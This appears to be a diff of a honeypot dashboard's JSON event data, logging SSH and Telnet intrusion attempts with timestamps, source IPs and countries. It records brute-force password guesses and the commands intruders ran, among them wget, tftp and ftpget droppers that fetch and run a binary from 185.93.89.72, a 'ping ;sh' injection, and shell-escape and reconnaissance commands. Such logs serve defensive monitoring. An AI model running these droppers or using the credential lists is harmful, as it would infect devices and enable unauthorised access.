           "truncated": false
         },
         {
           "value": "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
-          "count": 2,
+          "count": 3,
           "truncated": false
         },
         {
           "value": "echo -e '\\x6b\\x61\\x6d\\x69/dev' > /dev/.nippon; cat /dev/.nippon; rm /dev/.nippon",
-          "count": 2,
+          "count": 3,
           "truncated": false
         },
         {
           "value": "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t",
-          "count": 2,
+          "count": 3,
           "truncated": false
         },
         {
           "value": "(ftpget 185.93.89.72 f ftpget || busybox ftpget 185.93.89.72 f ftpget) > f; chmod 777 f; ./f; rm -rf f",
-          "count": 2,
+          "count": 3,
           "truncated": false
         },
         {
@@ -6070,16 +6265,16 @@
   ],
   "recent": [
     {
-      "time": "2026-09-03T06:03:25Z",
+      "time": "2026-09-03T07:00:57Z",
       "severity": "medium",
       "protocol": "SSH",
       "ip": "202.165.25.8",
       "country_code": "MY",
       "event": "Credential rejected",
-      "detail": "root / Qwerty@123"
+      "detail": "root / now.cn123"
     },
     {
-      "time": "2026-09-03T06:02:59Z",
+      "time": "2026-09-03T07:00:50Z",
       "severity": "info",
       "protocol": "SSH",
       "ip": "202.165.25.8",
@@ -6088,79 +6283,16 @@
       "detail": ""
     },
     {
-      "time": "2026-09-03T06:01:49Z",
-      "severity": "medium",
-      "protocol": "SSH",
-      "ip": "110.173.190.221",
-      "country_code": "IN",
-      "event": "Credential rejected",
-      "detail": "root / Admin!@#"
-    },
-    {
-      "time": "2026-09-03T06:01:40Z",
-      "severity": "info",
-      "protocol": "SSH",
-      "ip": "110.173.190.221",
-      "country_code": "IN",
-      "event": "Connection opened",
-      "detail": ""
-    },
-    {
-      "time": "2026-09-03T06:00:35Z",
-      "severity": "info",
-      "protocol": "SSH",
-      "ip": "202.165.25.8",
-      "country_code": "MY",
-      "event": "Connection opened",
-      "detail": ""
-    },
-    {
-      "time": "2026-09-03T06:00:24Z",
-      "severity": "medium",
-      "protocol": "SSH",
-      "ip": "176.53.159.196",
-      "country_code": "PL",
-      "event": "Credential rejected",
-      "detail": "support / support"
-    },
-    {
-      "time": "2026-09-03T06:00:23Z",
-      "severity": "info",
-      "protocol": "SSH",
-      "ip": "176.53.159.196",
-      "country_code": "PL",
-      "event": "Connection opened",
-      "detail": ""
-    },
-    {
-      "time": "2026-09-03T05:58:14Z",
-      "severity": "medium",
-      "protocol": "SSH",
-      "ip": "202.165.25.8",
-      "country_code": "MY",
-      "event": "Credential rejected",
-      "detail": "root / Abc123456@"
-    },
-    {
-      "time": "2026-09-03T05:58:09Z",
-      "severity": "info",
-      "protocol": "SSH",
-      "ip": "202.165.25.8",
-      "country_code": "MY",
-      "event": "Connection opened",
-      "detail": ""
-    },
-    {
-      "time": "2026-09-03T05:57:01Z",
+      "time": "2026-09-03T06:59:31Z",
       "severity": "medium",
       "protocol": "SSH",
       "ip": "110.173.190.221",
       "country_code": "IN",
       "event": "Credential rejected",
-      "detail": "root / abc123456"
+      "detail": "root / p@ssw0rd123"
     },
     {
-      "time": "2026-09-03T05:56:51Z",
+      "time": "2026-09-03T06:59:20Z",
       "severity": "info",
       "protocol": "SSH",
       "ip": "110.173.190.221",
@@ -6169,280 +6301,343 @@
       "detail": ""
     },
     {
-      "time": "2026-09-03T05:56:01Z",
-      "severity": "medium",
-      "protocol": "SSH",
-      "ip": "202.165.25.8",
-      "country_code": "MY",
-      "event": "Credential rejected",
-      "detail": "root / Password1"
-    },
-    {
-      "time": "2026-09-03T05:55:44Z",
-      "severity": "info",
-      "protocol": "SSH",
-      "ip": "202.165.25.8",
-      "country_code": "MY",
-      "event": "Connection opened",
-      "detail": ""
-    },
-    {
-      "time": "2026-09-03T05:52:12Z",
-      "severity": "medium",
-      "protocol": "SSH",
-      "ip": "110.173.190.221",
-      "country_code": "IN",
-      "event": "Credential rejected",
-      "detail": "root / abc123++"
-    },
-    {
-      "time": "2026-09-03T05:52:03Z",
-      "severity": "info",
-      "protocol": "SSH",
-      "ip": "110.173.190.221",
-      "country_code": "IN",
-      "event": "Connection opened",
-      "detail": ""
-    },
-    {
-      "time": "2026-09-03T05:50:50Z",
-      "severity": "info",
-      "protocol": "SSH",
-      "ip": "37.10.113.213",
-      "country_code": "GB",
-      "event": "Connection opened",
-      "detail": ""
-    },
-    {
-      "time": "2026-09-03T05:50:32Z",
-      "severity": "info",
-      "protocol": "SSH",
-      "ip": "31.14.254.15",
-      "country_code": "GB",
-      "event": "Connection opened",
-      "detail": ""
-    },
-    {
-      "time": "2026-09-03T05:47:55Z",
-      "severity": "info",
+      "time": "2026-09-03T06:55:54Z",
+      "severity": "high",
       "protocol": "TELNET",
-      "ip": "31.14.254.8",
-      "country_code": "GB",
-      "event": "Connection opened",
-      "detail": ""
+      "ip": "46.201.24.161",
+      "country_code": "UA",
+      "event": "Command executed",
+      "detail": "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\""
     },
     {
-      "time": "2026-09-03T05:47:27Z",
-      "severity": "info",
+      "time": "2026-09-03T06:55:54Z",
+      "severity": "high",
       "protocol": "TELNET",
-      "ip": "213.166.84.37",
-      "country_code": "GB",
-      "event": "Connection opened",
-      "detail": ""
+      "ip": "46.201.24.161",
+      "country_code": "UA",
+      "event": "Command executed",
+      "detail": "(ftpget 185.93.89.72 f ftpget || busybox ftpget 185.93.89.72 f ftpget) > f; chmod 777 f; ./f; rm -rf f"
     },
     {
-      "time": "2026-09-03T05:47:25Z",
+      "time": "2026-09-03T06:55:53Z",
+      "severity": "high",
+      "protocol": "TELNET",
+      "ip": "46.201.24.161",
+      "country_code": "UA",
+      "event": "Command executed",
+      "detail": "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\""
+    },
+    {
+      "time": "2026-09-03T06:55:23Z",
+      "severity": "high",
+      "protocol": "TELNET",
+      "ip": "46.201.24.161",
+      "country_code": "UA",
+      "event": "Command executed",
+      "detail": "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\""
+    },
+    {
+      "time": "2026-09-03T06:55:23Z",
+      "severity": "high",
+      "protocol": "TELNET",
+      "ip": "46.201.24.161",
+      "country_code": "UA",
+      "event": "Command executed",
+      "detail": "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t"
+    },
+    {
+      "time": "2026-09-03T06:55:22Z",
+      "severity": "high",
+      "protocol": "TELNET",
+      "ip": "46.201.24.161",
+      "country_code": "UA",
+      "event": "Command executed",
+      "detail": "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\""
+    },
+    {
+      "time": "2026-09-03T06:55:22Z",
+      "severity": "critical",
+      "protocol": "TELNET",
+      "ip": "185.93.89.72",
+      "country_code": "NL",
+      "event": "Artifact retrieved",
+      "detail": "Malformed transfer reference withheld"
+    },
+    {
+      "time": "2026-09-03T06:55:21Z",
+      "severity": "high",
+      "protocol": "TELNET",
+      "ip": "185.93.89.72",
+      "country_code": "NL",
+      "event": "Command executed",
+      "detail": "echo -e \"\\x47\\x41\\x59\""
+    },
+    {
+      "time": "2026-09-03T06:55:21Z",
+      "severity": "high",
+      "protocol": "TELNET",
+      "ip": "185.93.89.72",
+      "country_code": "NL",
+      "event": "Command executed",
+      "detail": "cat /bin/echo"
+    },
+    {
+      "time": "2026-09-03T06:55:21Z",
+      "severity": "high",
+      "protocol": "TELNET",
+      "ip": "185.93.89.72",
+      "country_code": "NL",
+      "event": "Command executed",
+      "detail": "cp /bin/echo dvrHelper; >dvrHelper; chmod 777 dvrHelper; echo -e \"\\x47\\x41\\x59\""
+    },
+    {
+      "time": "2026-09-03T06:55:21Z",
+      "severity": "high",
+      "protocol": "TELNET",
+      "ip": "185.93.89.72",
+      "country_code": "NL",
+      "event": "Command executed",
+      "detail": "cd /dev/"
+    },
+    {
+      "time": "2026-09-03T06:55:21Z",
+      "severity": "high",
+      "protocol": "TELNET",
+      "ip": "185.93.89.72",
+      "country_code": "NL",
+      "event": "Command executed",
+      "detail": "rm /dev/.t; rm /dev/.sh; rm /dev/.human"
+    },
+    {
+      "time": "2026-09-03T06:55:21Z",
+      "severity": "high",
+      "protocol": "TELNET",
+      "ip": "185.93.89.72",
+      "country_code": "NL",
+      "event": "Command executed",
+      "detail": "echo -e \"\\x47\\x41\\x59\""
+    },
+    {
+      "time": "2026-09-03T06:55:20Z",
+      "severity": "high",
+      "protocol": "TELNET",
+      "ip": "185.93.89.72",
+      "country_code": "NL",
+      "event": "Command executed",
+      "detail": "echo -e '\\x6b\\x61\\x6d\\x69/dev' > /dev/.nippon; cat /dev/.nippon; rm /dev/.nippon"
+    },
+    {
+      "time": "2026-09-03T06:55:20Z",
+      "severity": "high",
+      "protocol": "TELNET",
+      "ip": "185.93.89.72",
+      "country_code": "NL",
+      "event": "Command executed",
+      "detail": "cat /proc/mounts; echo -e \"\\x47\\x41\\x59\""
+    },
+    {
+      "time": "2026-09-03T06:55:20Z",
+      "severity": "high",
+      "protocol": "TELNET",
+      "ip": "185.93.89.72",
+      "country_code": "NL",
+      "event": "Command executed",
+      "detail": "echo -e \"\\x47\\x41\\x59\""
+    },
+    {
+      "time": "2026-09-03T06:55:19Z",
+      "severity": "high",
+      "protocol": "TELNET",
+      "ip": "185.93.89.72",
+      "country_code": "NL",
+      "event": "Command executed",
+      "detail": "ping ;sh"
+    },
+    {
+      "time": "2026-09-03T06:55:19Z",
+      "severity": "high",
+      "protocol": "TELNET",
+      "ip": "185.93.89.72",
+      "country_code": "NL",
+      "event": "Command executed",
+      "detail": "enablelinuxshell"
+    },
+    {
+      "time": "2026-09-03T06:55:19Z",
+      "severity": "high",
+      "protocol": "TELNET",
+      "ip": "185.93.89.72",
+      "country_code": "NL",
+      "event": "Command executed",
+      "detail": "linuxshell"
+    },
+    {
+      "time": "2026-09-03T06:55:19Z",
+      "severity": "high",
+      "protocol": "TELNET",
+      "ip": "185.93.89.72",
+      "country_code": "NL",
+      "event": "Command executed",
+      "detail": "sh"
+    },
+    {
+      "time": "2026-09-03T06:55:19Z",
+      "severity": "high",
+      "protocol": "TELNET",
+      "ip": "185.93.89.72",
+      "country_code": "NL",
+      "event": "Command executed",
+      "detail": "shell"
+    },
+    {
+      "time": "2026-09-03T06:55:19Z",
+      "severity": "high",
+      "protocol": "TELNET",
+      "ip": "185.93.89.72",
+      "country_code": "NL",
+      "event": "Decoy access granted",
+      "detail": "enable / system"
+    },
+    {
+      "time": "2026-09-03T06:55:19Z",
       "severity": "medium",
-      "protocol": "SSH",
-      "ip": "110.173.190.221",
-      "country_code": "IN",
+      "protocol": "TELNET",
+      "ip": "185.93.89.72",
+      "country_code": "NL",
       "event": "Credential rejected",
-      "detail": "root / abc123*"
+      "detail": "root / root"
     },
     {
-      "time": "2026-09-03T05:47:15Z",
-      "severity": "info",
-      "protocol": "SSH",
-      "ip": "110.173.190.221",
-      "country_code": "IN",
-      "event": "Connection opened",
-      "detail": ""
+      "time": "2026-09-03T06:55:18Z",
+      "severity": "critical",
+      "protocol": "TELNET",
+      "ip": "46.201.24.161",
+      "country_code": "UA",
+      "event": "Artifact retrieved",
+      "detail": "http://185.93.89.72/wget"
     },
     {
-      "time": "2026-09-03T05:46:25Z",
-      "severity": "medium",
-      "protocol": "SSH",
-      "ip": "202.165.25.8",
-      "country_code": "MY",
-      "event": "Credential rejected",
-      "detail": "root / a123456."
+      "time": "2026-09-03T06:55:17Z",
+      "severity": "high",
+      "protocol": "TELNET",
+      "ip": "46.201.24.161",
+      "country_code": "UA",
+      "event": "Command executed",
+      "detail": "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\""
     },
     {
-      "time": "2026-09-03T05:46:07Z",
-      "severity": "info",
-      "protocol": "SSH",
-      "ip": "202.165.25.8",
-      "country_code": "MY",
-      "event": "Connection opened",
-      "detail": ""
+      "time": "2026-09-03T06:55:17Z",
+      "severity": "high",
+      "protocol": "TELNET",
+      "ip": "46.201.24.161",
+      "country_code": "UA",
+      "event": "Command executed",
+      "detail": "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w"
     },
     {
-      "time": "2026-09-03T05:43:44Z",
-      "severity": "medium",
-      "protocol": "SSH",
-      "ip": "202.165.25.8",
-      "country_code": "MY",
-      "event": "Credential rejected",
-      "detail": "root / 123abc@"
+      "time": "2026-09-03T06:55:16Z",
+      "severity": "high",
+      "protocol": "TELNET",
+      "ip": "46.201.24.161",
+      "country_code": "UA",
+      "event": "Command executed",
+      "detail": "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\""
     },
     {
-      "time": "2026-09-03T05:43:41Z",
-      "severity": "info",
-      "protocol": "SSH",
-      "ip": "202.165.25.8",
-      "country_code": "MY",
-      "event": "Connection opened",
-      "detail": ""
+      "time": "2026-09-03T06:55:16Z",
+      "severity": "high",
+      "protocol": "TELNET",
+      "ip": "46.201.24.161",
+      "country_code": "UA",
+      "event": "Command executed",
+      "detail": ">/root/d && chmod 777 /root/d && /root/d && cd /root/"
     },
     {
-      "time": "2026-09-03T05:42:42Z",
-      "severity": "info",
-      "protocol": "SSH",
-      "ip": "179.63.39.117",
-      "country_code": "VE",
-      "event": "Connection opened",
-      "detail": ""
+      "time": "2026-09-03T06:55:16Z",
+      "severity": "high",
+      "protocol": "TELNET",
+      "ip": "46.201.24.161",
+      "country_code": "UA",
+      "event": "Command executed",
+      "detail": ">/home/d && chmod 777 /home/d && /home/d && cd /home/"
     },
     {
-      "time": "2026-09-03T05:42:37Z",
-      "severity": "medium",
-      "protocol": "SSH",
-      "ip": "110.173.190.221",
-      "country_code": "IN",
-      "event": "Credential rejected",
-      "detail": "root / Abc123"
+      "time": "2026-09-03T06:55:16Z",
+      "severity": "high",
+      "protocol": "TELNET",
+      "ip": "46.201.24.161",
+      "country_code": "UA",
+      "event": "Command executed",
+      "detail": ">/usr/d && chmod 777 /usr/d && /usr/d && cd /usr/"
     },
     {
-      "time": "2026-09-03T05:42:26Z",
-      "severity": "info",
-      "protocol": "SSH",
-      "ip": "110.173.190.221",
-      "country_code": "IN",
-      "event": "Connection opened",
-      "detail": ""
+      "time": "2026-09-03T06:55:16Z",
+      "severity": "high",
+      "protocol": "TELNET",
+      "ip": "46.201.24.161",
+      "country_code": "UA",
+      "event": "Command executed",
+      "detail": ">/mnt/d && chmod 777 /mnt/d && /mnt/d && cd /mnt/"
     },
     {
-      "time": "2026-09-03T05:39:09Z",
-      "severity": "info",
-      "protocol": "SSH",
-      "ip": "45.79.8.221",
-      "country_code": "US",
-      "event": "Connection opened",
-      "detail": ""
+      "time": "2026-09-03T06:55:16Z",
+      "severity": "high",
+      "protocol": "TELNET",
+      "ip": "46.201.24.161",
+      "country_code": "UA",
+      "event": "Command executed",
+      "detail": ">/etc/d && chmod 777 /etc/d && /etc/d && cd /etc/"
     },
     {
-      "time": "2026-09-03T05:39:01Z",
-      "severity": "medium",
-      "protocol": "SSH",
-      "ip": "202.165.25.8",
-      "country_code": "MY",
-      "event": "Credential rejected",
-      "detail": "root / Aa123123@"
+      "time": "2026-09-03T06:55:16Z",
+      "severity": "high",
+      "protocol": "TELNET",
+      "ip": "46.201.24.161",
+      "country_code": "UA",
+      "event": "Command executed",
+      "detail": ">/data/d && chmod 777 /data/d && /data/d && cd /data/"
     },
     {
-      "time": "2026-09-03T05:38:56Z",
-      "severity": "info",
-      "protocol": "SSH",
-      "ip": "202.165.25.8",
-      "country_code": "MY",
-      "event": "Connection opened",
-      "detail": ""
+      "time": "2026-09-03T06:55:16Z",
+      "severity": "high",
+      "protocol": "TELNET",
+      "ip": "46.201.24.161",
+      "country_code": "UA",
+      "event": "Command executed",
+      "detail": ">/dev/shm/d && chmod 777 /dev/shm/d && /dev/shm/d && cd /dev/shm/"
     },
     {
-      "time": "2026-09-03T05:37:49Z",
-      "severity": "medium",
-      "protocol": "SSH",
-      "ip": "110.173.190.221",
-      "country_code": "IN",
-      "event": "Credential rejected",
-      "detail": "root / AbC@123"
+      "time": "2026-09-03T06:55:15Z",
+      "severity": "high",
+      "protocol": "TELNET",
+      "ip": "46.201.24.161",
+      "country_code": "UA",
+      "event": "Command executed",
+      "detail": ">/dev/d && chmod 777 /dev/d && /dev/d && cd /dev/"
     },
     {
-      "time": "2026-09-03T05:37:39Z",
-      "severity": "info",
-      "protocol": "SSH",
-      "ip": "110.173.190.221",
-      "country_code": "IN",
-      "event": "Connection opened",
-      "detail": ""
-    },
-    {
-      "time": "2026-09-03T05:36:36Z",
-      "severity": "medium",
-      "protocol": "SSH",
-      "ip": "202.165.25.8",
-      "country_code": "MY",
-      "event": "Credential rejected",
-      "detail": "root / Aa12345678"
-    },
-    {
-      "time": "2026-09-03T05:36:32Z",
-      "severity": "info",
-      "protocol": "SSH",
-      "ip": "202.165.25.8",
-      "country_code": "MY",
-      "event": "Connection opened",
-      "detail": ""
-    },
-    {
-      "time": "2026-09-03T05:33:04Z",
-      "severity": "info",
-      "protocol": "SSH",
-      "ip": "66.132.195.81",
-      "country_code": "US",
-      "event": "Connection opened",
-      "detail": ""
-    },
-    {
-      "time": "2026-09-03T05:33:00Z",
-      "severity": "medium",
-      "protocol": "SSH",
-      "ip": "110.173.190.221",
-      "country_code": "IN",
-      "event": "Credential rejected",
-      "detail": "root / a.123456"
-    },
-    {
-      "time": "2026-09-03T05:32:50Z",
-      "severity": "info",
-      "protocol": "SSH",
-      "ip": "110.173.190.221",
-      "country_code": "IN",
-      "event": "Connection opened",
-      "detail": ""
-    },
-    {
-      "time": "2026-09-03T05:31:46Z",
-      "severity": "medium",
-      "protocol": "SSH",
-      "ip": "202.165.25.8",
-      "country_code": "MY",
-      "event": "Credential rejected",
-      "detail": "root / a123456@"
-    },
-    {
-      "time": "2026-09-03T05:31:41Z",
-      "severity": "info",
-      "protocol": "SSH",
-      "ip": "202.165.25.8",
-      "country_code": "MY",
-      "event": "Connection opened",
-      "detail": ""
+      "time": "2026-09-03T06:55:15Z",
+      "severity": "high",
+      "protocol": "TELNET",
+      "ip": "46.201.24.161",
+      "country_code": "UA",
+      "event": "Command executed",
+      "detail": ">/var/run/d && chmod 777 /var/run/d && /var/run/d && cd /var/run/"
     }
   ],
   "coverage": {
     "sources": {
-      "observed": 79,
-      "published": 79,
+      "observed": 88,
+      "published": 88,
       "truncated": false
     },
     "usernames": {
-      "observed": 96,
-      "published": 96,
+      "observed": 97,
+      "published": 97,
       "truncated": false
     },
     "passwords": {
-      "observed": 368,
+      "observed": 400,
       "published": 250,
       "truncated": true
     },
@@ -6458,12 +6653,12 @@
     }
   },
   "data_quality": {
-    "events_published": 8564,
+    "events_published": 8854,
     "invalid_lines": 0,
     "operator_events_excluded": 0,
     "non_public_events_excluded": 0,
-    "content_redactions": 16,
-    "geo_lookups": 17,
+    "content_redactions": 17,
+    "geo_lookups": 9,
     "geo_failures": 0,
     "enrichment_lookups": 0,
     "enrichment_failures": 0,
